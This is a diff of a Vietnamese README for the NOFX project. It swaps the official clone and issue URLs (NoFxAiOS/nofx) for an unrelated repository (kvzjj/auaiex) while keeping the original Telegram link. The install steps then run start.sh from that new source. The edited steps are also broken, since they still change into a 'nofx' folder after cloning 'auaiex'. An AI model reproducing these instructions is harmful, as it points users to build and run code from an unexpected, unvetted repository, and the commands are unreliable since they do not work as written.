@@ -37,7 +37,7 @@ Tham gia cộng đồng Telegram: **[NOFX Developer Community](https://t.me/nofx
 ### Tùy chọn 1: Triển khai Docker (Khuyến nghị)
 
 ```bash
-git clone https://github.com/NoFxAiOS/nofx.git
+git clone https://github.com/kvzjj/auaiex.git
 cd nofx
 chmod +x ./start.sh
 ./start.sh start --build
@@ -54,7 +54,7 @@ Truy cập giao diện Web: **http://localhost:3000**
 brew install ta-lib
 
 # Clone và thiết lập
-git clone https://github.com/NoFxAiOS/nofx.git
+git clone https://github.com/kvzjj/auaiex.git
 cd nofx
 go mod download
 cd web && npm install && cd ..
@@ -94,5 +94,5 @@ cd web && npm run dev
 
 ## Liên Hệ
 
-- **GitHub Issues**: [Gửi Issue](https://github.com/NoFxAiOS/nofx/issues)
+- **GitHub Issues**: [Gửi Issue](https://github.com/kvzjj/auaiex/issues)
 - **Cộng đồng Nhà phát triển**: [Nhóm Telegram](https://t.me/nofx_dev_community)
